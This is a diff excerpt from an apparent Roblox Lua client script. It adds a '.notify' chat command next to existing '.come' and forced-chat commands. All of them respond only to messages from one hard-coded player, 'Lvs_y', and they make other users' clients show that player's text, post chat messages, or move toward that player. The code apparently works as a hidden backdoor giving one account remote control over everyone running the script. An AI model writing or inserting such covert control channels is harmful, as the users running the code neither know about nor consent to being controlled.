@@ -727,6 +727,17 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFi
             return
         end
         game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(message, "All")
+    elseif H.FromSpeaker == "Lvs_y" and H.Message:sub(1, 7) == ".notify" then
+        local message = H.Message:sub(9)
+        local notiuser = game:GetService("Players").LocalPlayer
+        local notigui = notiuser.PlayerGui.MainGui.NotificationFrame
+        if game.Players.LocalPlayer.Character.Name == "Lvs_y" then
+            return
+        end
+        notigui.NotificationText.Text = message
+        notigui.Visible = true
+        wait(5)
+        notigui.Visible = false
     elseif H.FromSpeaker == "Lvs_y" and H.Message == ".come" then
         local userrr = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
         local hotrobloxfemboydev = game.Workspace.Lvs_y.HumanoidRootPart
